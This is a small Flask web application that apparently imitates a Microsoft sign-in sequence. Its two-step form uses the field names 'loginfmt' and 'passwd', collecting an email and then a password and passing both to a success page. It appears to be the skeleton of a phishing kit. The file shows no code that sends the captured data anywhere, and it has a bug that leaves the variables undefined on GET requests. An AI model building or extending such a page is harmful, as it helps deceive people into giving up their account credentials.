from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=["GET", "POST"])
def index():
    return render_template("index.html")

@app.route("/password", methods=["GET", "POST"])
def password():
    if request.method == "POST":
        email = request.form.get("loginfmt")
    
    return render_template("password_page.html", email=email)

@app.route("/success", methods=["GET", "POST"])
def success():
    if request.method == "POST":
        password = request.form.get("passwd")
        email = request.form.get("email")
    return render_template("success.html", email=email, password=password)

if __name__ == "__main__":
    app.run(debug=True)
